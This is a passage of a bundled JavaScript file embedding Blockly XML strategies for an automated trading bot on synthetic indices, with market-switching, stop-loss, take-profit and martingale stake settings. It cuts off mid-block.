name="VAR" id="Qq28jzu{61V^?3_DKY1z" variabletype="">text</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="btnotify" id="-SP}Fsj;VS{Vk[GagAWn" collapsed="true">\n                        <field name="NOTIFICATION_TYPE">info</field>\n                        <field name="NOTIFICATION_SOUND">silent</field>\n                        <value name="MESSAGE">\n                          <shadow type="text" id="yw$U|2n8Gf8-:q#q_G/j">\n                            <field name="TEXT">\uD83C\uDF84\uD83C\uDF81 Christmas Gift By Binarytool \uD83C\uDF81\uD83C\uDF84</field>\n                          </shadow>\n                        </value>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id=":Tq]VUlM=BJk#=;.3aYU" collapsed="true" x="0" y="2476">\n    <field name="NAME">Prevent Over Trading</field>\n    <statement name="STACK">\n      <block type="controls_if" id="hw=cT/cCl+J0)lT-lieP">\n        <value name="IF0">\n          <block type="logic_compare" id=",:0WEpD-U?+dK}3Q/}sl">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="F9!pA:tc?{?=$.^O[e{9">\n                <field name="VAR" id=":,%~KY@s+t4t[x%D|Rs`" variabletype="">Set Maximum Runs</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="logic_boolean" id="50Dv6P9X0=L]tRV/}{#`">\n                <field name="BOOL">TRUE</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="variables_set" id="^$ZZ[~UuPdsc%*9amek!">\n            <field name="VAR" id="tpKgmnH0mz*.t/T=*i|V" variabletype="">Maximum Runs</field>\n            <value name="VALUE">\n              <block type="text_prompt_ext" id="%1Dfmh2=LNu,Q,^FC^tX">\n                <field name="TYPE">NUMBER</field>\n                <value name="TEXT">\n                  <shadow type="text" id="W|I![6p5zg4*ooTjlFo.">\n                    <field name="TEXT">abc</field>\n                  </shadow>\n                  <block type="text" id="U./mgz-v!VgWHMpaWA$f">\n                    <field name="TEXT">MAXIMUM NO. OF RUNS PER SESSION  [3-5 RECOMMENDED]</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id="FrhP.v@2:JZ=^x?jnS$%" collapsed="true" x="0" y="2572">\n    <field name="NAME">Switch Markets</field>\n    <statement name="STACK">\n      <block type="controls_if" id="VGZPogGY0Set{6_anb^G">\n        <value name="IF0">\n          <block type="variables_get" id="*Q:5xM72M0uH1c4n)z`m">\n            <field name="VAR" id="@VN/)JBDaz5d-aHKEiy:" variabletype="">Switch Markets</field>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="controls_if" id="Ki6kTyGNE=5#A}+Gg,03">\n            <mutation elseif="9"></mutation>\n            <value name="IF0">\n              <block type="logic_compare" id=")RN1:VOnXI9Vk6.4roIe">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="T!R:J2x!dxRo]dj}O8(;">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="^E=;m#1KAneN`S:G:2CS">\n                    <field name="NUM">0</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="active_symbol_changer" id="-ZxS^B8T}|,HpOC%(Q{b">\n                <field name="SYMBOL_ACTIVE_TYPE">disable</field>\n                <next>\n                  <block type="math_change" id="P}x0(E:6`/|(_Ea|xuO^">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                    <value name="DELTA">\n                      <shadow type="math_number" id="Kepl7mFD7Q+~%.k~f4{5">\n                        <field name="NUM">1</field>\n                      </shadow>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF1">\n              <block type="logic_compare" id="m5vX2MyIr4aZ2Z_SfSZZ">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="~D0j-xolT?r3DAkm@[yF">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="mfil0y+(%k2~t|-?3EaY">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO1">\n              <block type="math_change" id="JKDEDg;Ys7Y^UlZgyr`L">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="h=g9/nQ(=[M:tSxL{|Ee">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="NqArOhvF`dZYzINFUsKx">\n                    <field name="SYMBOL_ACTIVE_TYPE">R_10</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF2">\n              <block type="logic_compare" id="5gT$!er~9CHL:IAap[Bl">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="^BT`2{m!}J^tc~Q,CJb9">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="?VFC]H}/sT/Ox}+1AzNn">\n                    <field name="NUM">2</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO2">\n              <block type="math_change" id="?hsN1hTjE#p#5U@@dARD">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="t+/l~tS0c56_.v+{6ve:">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="T%SI$7#V|!--$bT@Mv9D">\n                    <field name="SYMBOL_ACTIVE_TYPE">1HZ25V</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF3">\n              <block type="logic_compare" id=":/zVQoL2!_bjTeDx[LR6">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="$+4bF,x2VOu(Z~h$9wHx">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id=":T.32sK|]}^Q1?f#;5?W">\n                    <field name="NUM">3</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO3">\n              <block type="math_change" id="*s9r4kZgmsshX/`~7il.">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="tt4#*_)2#g8Fe!i#FJq^">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="~BuR4g0t@I)aUy?+F?6f">\n                    <field name="SYMBOL_ACTIVE_TYPE">R_25</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF4">\n              <block type="logic_compare" id="_c[I7*nq^TaqO|=F1sS|">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="BsT9ufUY=6Z`()~JYK_E">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="ktQ-AOll^a3oeOzKl[n-">\n                    <field name="NUM">4</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO4">\n              <block type="math_change" id="S5T^9^i[t$ui78zpcXhX">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="L~y-nLlv]J0%#!@cu9lG">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="d;UjX}NZt|ZI?o`dj(2M">\n                    <field name="SYMBOL_ACTIVE_TYPE">1HZ50V</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF5">\n              <block type="logic_compare" id="(}%3CM*e%tc~Ws0)6S7X">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="[`P4=vqTD90T2;{b:3QX">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="tN^-(Ge,0B[/%5ul,3ml">\n                    <field name="NUM">5</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO5">\n              <block type="math_change" id="EgKJ*IuoZ+^%XeHuBS%s">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="DaE|Q#[}}Dliwpg;gcBa">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="0]U;{fm=H3gkmj[I4UBt">\n                    <field name="SYMBOL_ACTIVE_TYPE">R_50</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF6">\n              <block type="logic_compare" id="ft{li;Mhn|D[PhJ!s~?5">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="5m*T?)fR*MmV$zp)VVM8">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="OTg-f}eGcCi7LC3TY7if">\n                    <field name="NUM">6</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO6">\n              <block type="math_change" id="e)P?$);8NQ08|,zw?L$2">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="DK8;=cbwYTU!`:j8@oCx">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id=":o|g$E2[oc*-SnoE6j5v">\n                    <field name="SYMBOL_ACTIVE_TYPE">1HZ75V</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF7">\n              <block type="logic_compare" id="|*cb5uT?#D/4qX9rwfOU">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="YQq|Mo=WtahBh%Z5;LQ^">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="%BMHyxCJHIqKc:Qav1SD">\n                    <field name="NUM">7</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO7">\n              <block type="math_change" id="(xi?s#+N:[Jnbp8ne~-q">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="M%l{m?_]xV1l*4x}F5}H">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="uUE8bKj!o!^IEOUpsq].">\n                    <field name="SYMBOL_ACTIVE_TYPE">R_75</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF8">\n              <block type="logic_compare" id="^560qRq.HiF9s~qY-0J|">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="}RGyHH-OOT#Aj!g|6Jv1">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="+rWG01YI]k`6a+*y*Rq[">\n                    <field name="NUM">8</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO8">\n              <block type="math_change" id="?VTZTO?K~$j~=DoY*)h9">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="%oBAmNX:4b,g}jqhZQlR">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="JDlwY!|41d%Y%@iV|GWx">\n                    <field name="SYMBOL_ACTIVE_TYPE">1HZ100V</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF9">\n              <block type="logic_compare" id="jr#1JwW4oZQy7gj.07jU">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="L1mLq.=%V369lY^EOgdz">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="bOfynK:1K#@4R(r*2PkT">\n                    <field name="NUM">9</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO9">\n              <block type="active_symbol_changer" id="GE6Cz/eu?nKq(;!dgtvt">\n                <field name="SYMBOL_ACTIVE_TYPE">R_100</field>\n                <next>\n                  <block type="variables_set" id="6|am|{Qan=}eJ4%WGqBc">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="e+T*@qF]C)8m^d[%!=4)">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            35630: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="o!-=j_eJZCfW(+iV7;MS" islocal="false" iscloud="false">Tick 1</variable>\n    <variable type="" id="7Q4y$nr_sr!x2NkOu%)2" islocal="false" iscloud="false">Stake</variable>\n    <variable type="" id="b~M_gc!6d^tXHe/]?+}`" islocal="false" iscloud="false">Tick 2</variable>\n    <variable type="" id=":Z8WvPXWG?qCe|8=iii1" islocal="false" iscloud="false">Expected Profit</variable>\n    <variable type="" id="S10~wx4EJ/w3gZZ;v77Y" islocal="false" iscloud="false">Total Lost</variable>\n    <variable type="" id="!}o95im:dfosc$6[v%LW" islocal="false" iscloud="false">Tick 3</variable>\n    <variable type="" id="~ZEk9Zr7t[g;-`afIGOO" islocal="false" iscloud="false">Initial Stake</variable>\n    <variable type="" id="L.cN$B-UUzkS|eDQm2xZ" islocal="false" iscloud="false">Stop Loss</variable>\n    <variable type="" id="Op-Cim@t?DJN?i;G)w)C" islocal="false" iscloud="false">Count Loss</variable>\n    <variable type="" id="S|AWDr;xbKU_pbl(^]^B" islocal="false" iscloud="false">Tick 4</variable>\n    <variable type="" id="!mQjsA[]viO$7Gu~UzUn" islocal="false" iscloud="false">Martingale Split</variable>\n    <variable type="" id="VK7:nSRSXJ=|#p(oAU9v" islocal="false" iscloud="false">Payout %</variable>\n    <variable type="" id="icmJXVK=|*WSXkYEU*E;" islocal="false" iscloud="false">text</variable>\n    <variable type="" id="Y$cG[}L|(_T-=;0ZyXI." islocal="false" iscloud="false">text1</variable>\n    <variable type="" id="$+Q3~hzlFiI[$SMrBNB?" islocal="false" iscloud="false">Prediction</variable>\n    <variable type="" id="+L:nET.PS2OXV5VNGInM" islocal="false" iscloud="false">Analysis</variable>\n    <variable type="" id="2/ozQp|pSBT9oqJ(u7uu" islocal="false" iscloud="false">Entrypoint</variable>\n    <variable type="" id="sF6($OTq!BVWswgj}4|S" islocal="false" iscloud="false">Prediction before loss</variable>\n    <variable type="" id="OPb$Wwph1|)^r0#|^^y}" islocal="false" iscloud="false">Prediction after loss</variable>\n    <variable type="" id="x`Ia+qCu@StiaJI^X([4" islocal="false" iscloud="false">Entrypoint-Digit</variable>\n  </variables>\n  <block type="trade_definition" id="deUzn(1}F)X6;d+O#$A8" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="*ZjSt,1/{;THl;IV%*sy" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">1HZ10V</field>\n        <next>\n          <block type="trade_definition_tradetype" id="xzc0Sl`,#G4h{;usN50T" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">overunder</field>\n            <next>\n              <block type="trade_definition_contracttype" id="z9892C3%qM2{aa@jy]2]" deletable="false" movable="false">\n                <field name="TYPE_LIST">DIGITUNDER</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id=";)B,zZH~+e,96QvZt*7;" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="5E?,-;gq5Qu_eyIs.)m!" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="?u~0^reDb~fVp[b-~w|G" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="4$5m(H*{`c4#S-)o=;aV">\n        <field name="VAR" id="sF6($OTq!BVWswgj}4|S" variabletype="">Prediction before loss</field>\n        <value name="VALUE">\n          <block type="math_number" id="Ai5]{:#d~w;]%q`:p[h,">\n            <field name="NUM">8</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="f;c!1^-bb9K7rQ{#3/l0">\n            <field name="VAR" id="OPb$Wwph1|)^r0#|^^y}" variabletype="">Prediction after loss</field>\n            <value name="VALUE">\n              <block type="math_number" id="gT6?xbULKjs8^Sw?0iH%">\n                <field name="NUM">6</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="_aSBe^/).nS{bwLbiE9n">\n                <field name="VAR" id="x`Ia+qCu@StiaJI^X([4" variabletype="">Entrypoint-Digit</field>\n                <value name="VALUE">\n                  <block type="math_number" id="KR2=c$XO!b_Bgl_ASR4(">\n                    <field name="NUM">7</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="y-?,og][*D.g)z`wz~sr">\n                    <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="!TI[pk;TXnU%n?K/nH:^">\n                        <field name="NUM">1</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="9.jN~btog59cUwf8:lPl">\n                        <field name="VAR" id=":Z8WvPXWG?qCe|8=iii1" variabletype="">Expected Profit</field>\n                        <value name="VALUE">\n                          <block type="math_number" id=".`(0weVv%;N,|MA`*;Ll">\n                            <field name="NUM">100</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="MpN0,W8A;joH2n#IXF@!">\n                            <field name="VAR" id="L.cN$B-UUzkS|eDQm2xZ" variabletype="">Stop Loss</field>\n                            <value name="VALUE">\n                              <block type="math_number" id="tACLVvalL.#)Xxz`ZoBC">\n                                <field name="NUM">1000</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="-z^omJLEhT5`I:NZ;J=-">\n                                <field name="VAR" id="~ZEk9Zr7t[g;-`afIGOO" variabletype="">Initial Stake</field>\n                                <value name="VALUE">\n                                  <block type="variables_get" id="SoAC,+VI6PpU1=/|ThHQ">\n                                    <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id=":y8AYtv{x`8LFslg8@Pc">\n                                    <field name="VAR" id="!mQjsA[]viO$7Gu~UzUn" variabletype="">Martingale Split</field>\n                                    <value name="VALUE">\n                                      <block type="math_number" id="LqV%S=;Xlb|o9}weJjz1">\n                                        <field name="NUM">2.55</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="variables_set" id="7A:2S/;VFh?W0fI|W^{]">\n                                        <field name="VAR" id="VK7:nSRSXJ=|#p(oAU9v" variabletype="">Payout %</field>\n                                        <value name="VALUE">\n                                          <block type="math_number" id="*nsC7E`vh$_)]~v1u.#[">\n                                            <field name="NUM">39</field>\n                                          </block>\n                                        </value>\n                                        <next>\n                                          <block type="variables_set" id="i-+y35ET%iNI#gfE=j}f">\n                                            <field name="VAR" id="$+Q3~hzlFiI[$SMrBNB?" variabletype="">Prediction</field>\n                                            <value name="VALUE">\n                                              <block type="variables_get" id="lz5.rXO5Nim{3$+J{lQc">\n                                                <field name="VAR" id="sF6($OTq!BVWswgj}4|S" variabletype="">Prediction before loss</field>\n                                              </block>\n                                            </value>\n                                            <next>\n                                              <block type="variables_set" id="8pGcw{d^D[X~Q9WWr9L$">\n                                                <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n                                                <value name="VALUE">\n                                                  <block type="text" id="CSPjU%E/2Z*fs-7r2@%|">\n                                                    <field name="TEXT">analysis</field>\n                                                  </block>\n                                                </value>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions" id="+2=*XrtB:_,H.ZbX=p:?">\n        <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n        <field name="DURATIONTYPE_LIST">t</field>\n        <value name="DURATION">\n          <shadow type="math_number" id=".VN]5$PRz#[mu4gLEpE)">\n            <field name="NUM">1</field>\n          </shadow>\n        </value>\n        <value name="AMOUNT">\n          <shadow type="math_number" id="uDV:;sle3{o8l:/liSA4">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="e8^MR4,v|mL$uYo-N2,7">\n            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n          </block>\n        </value>\n        <value name="PREDICTION">\n          <shadow type="math_number_positive" id="kiyp4(UR1};9-zUVUD2B">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="7M|Q{wh7BX?zpzY|TlN.">\n            <field name="VAR" id="$+Q3~hzlFiI[$SMrBNB?" variabletype="">Prediction</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="ymTrZ2T/bD#hXN^}%;gD" x="948" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id="aZ/eJwRn+2B?g?#!Rb%#">\n        <mutation elseif="1" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="=CPoUAxWy4D?!*TdX_:Q">\n            <field name="OP">GT</field>\n            <value name="A">\n              <block type="total_profit" id="%W]vwSTU2OHqSjiF#6vF"></block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="u{$,)w%F3EH+k_ppwTuh">\n                <field name="VAR" id=":Z8WvPXWG?qCe|8=iii1" variabletype="">Expected Profit</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="text_join" id="wXlfZYv9q1.db)%Mk;n:">\n            <field name="VARIABLE" id="Y$cG[}L|(_T-=;0ZyXI." variabletype="">text1</field>\n            <statement name="STACK">\n              <block type="text_statement" id="fEODtPvxb~Pq9(wLL(7)">\n                <value name="TEXT">\n                  <shadow type="text" id="}G!me?B=1d+JazlN/cn9">\n                    <field name="TEXT"></field>\n                  </shadow>\n                  <block type="text" id="}z_N)o#C_q%y%O*-06h[">\n                    <field name="TEXT">Tp hit</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="text_statement" id="[DYy),LGh$:we/z91nXm">\n                    <value name="TEXT">\n                      <shadow type="text" id="$iphA?Wh5=3Cir9KM{OT">\n                        <field name="TEXT"></field>\n                      </shadow>\n                      <block type="text" id="cc=!2%kS#4A#EaD1emS4">\n                        <field name="TEXT">&lt;&lt; CONGRATULATIONS. &gt;&gt; You have successfully printed&gt;  &amp;</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="text_statement" id=":{/=:+zah8V6/Q?ZE{(z">\n                        <value name="TEXT">\n                          <shadow type="text" id="A`([INSV+:7ygD7cZ@j;">\n                            <field name="TEXT"></field>\n                          </shadow>\n                          <block type="total_profit" id="A~!}?z=.-$yZ3Y${jZ~4"></block>\n                        </value>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="text_print" id="bn4.=Kye=;B06#m*^]Mz">\n                <value name="TEXT">\n                  <shadow type="text" id="L;9=9qa,@)]+arRqzGT|">\n                    <field name="TEXT">abc</field>\n                  </shadow>\n                  <block type="variables_get" id="_a38DajDS)I21w2c[1Ou">\n                    <field name="VAR" id="Y$cG[}L|(_T-=;0ZyXI." variabletype="">text1</field>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="z5WP~8PDdgsb($NhN;$|">\n            <field name="OP">LTE</field>\n            <value name="A">\n              <block type="total_profit" id="U(mi=kxH#ytDrvpszM,|"></block>\n            </value>\n            <value name="B">\n              <block type="math_single" id="?vi^Mf0IMKgiWl?7(kXF">\n                <field name="OP">NEG</field>\n                <value name="NUM">\n                  <shadow type="math_number" id="G5%tZ/b;7*ZdUOhD/7]Y">\n                    <field name="NUM">9</field>\n                  </shadow>\n                  <block type="variables_get" id="%0X#dsb^67G_o-lF}4z#">\n                    <field name="VAR" id="L.cN$B-UUzkS|eDQm2xZ" variabletype="">Stop Loss</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="text_print" id="W[bg`R=Gq/~{0M#AfLt}">\n            <value name="TEXT">\n              <shadow type="text" id="su#SP}OYEm942K4~)nLH">\n                <field name="TEXT">SL hit</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="*Gyn=E:%D.Zg+QXU4/5B">\n            <mutation else="1"></mutation>\n            <value name="IF0">\n              <block type="contract_check_result" id="4dW}cXg#gmD#,,rnEyQ*">\n                <field name="CHECK_RESULT">loss</field>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="math_change" id="DmlXTt^a/Pz.1ZcJ1[DB">\n                <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="@KJq1;gh,*]xXvHs%wR]">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="variables_get" id="5OL;;LN/RE~[8skE!*`8">\n                    <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="controls_if" id="vJz]y7]1v7[Lay.S9|RQ">\n                    <value name="IF0">\n                      <block type="logic_compare" id="TiYBy5{NUh21rh!]WP1{">\n                        <field name="OP">GT</field>\n                        <value name="A">\n                          <block type="variables_get" id="_f9{!u:oct6GDaaZc/?t">\n                            <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="math_number" id="!1:Qc)Cp#@{W$~?Jc;jw">\n                            <field name="NUM">0</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <statement name="DO0">\n                      <block type="variables_set" id="CB;A*!5?-TW-xF)m}DIX">\n                        <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="6)f[75M@_[kv*{G8[P6y">\n                            <field name="NUM">0</field>\n                          </block>\n                        </value>\n                      </block>\n                    </statement>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="variables_set" id="He_x6j*4kHFBYva,NX(%">\n                <field name="VAR" id="$+Q3~hzlFiI[$SMrBNB?" variabletype="">Prediction</field>\n                <value name="VALUE">\n                  <block type="variables_get" id="y!8w@QY!!M{={xj7YcAc">\n                    <field name="VAR" id="OPb$Wwph1|)^r0#|^^y}" variabletype="">Prediction after loss</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="{Bzpl6Bze5j1=9;KTYo!">\n                    <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n                    <value name="VALUE">\n                      <block type="text" id="Ko,r`,iWR)zE2?zoQPy*">\n                        <field name="TEXT">gk</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="math_change" id="[(u[h.H,+ZSePi._I#Ae">\n                        <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                        <value name="DELTA">\n                          <shadow type="math_number" id=";vm%OPmNCN=gCQW)(t@S">\n                            <field name="NUM">1</field>\n                          </shadow>\n                          <block type="math_single" id=";pMO[^7+@pX!F6{PO,cu">\n                            <field name="OP">NEG</field>\n                            <value name="NUM">\n                              <shadow type="math_number" id=")8P8lMVf0i}%mC/@]7-e">\n                                <field name="NUM">9</field>\n                              </shadow>\n                              <block type="read_details" id="qgSZdkTT+k._L1{~5Yf|">\n                                <field name="DETAIL_INDEX">4</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="controls_if" id="KJ*,2)^Zgv|0RqFOPd5Q">\n                            <value name="IF0">\n                              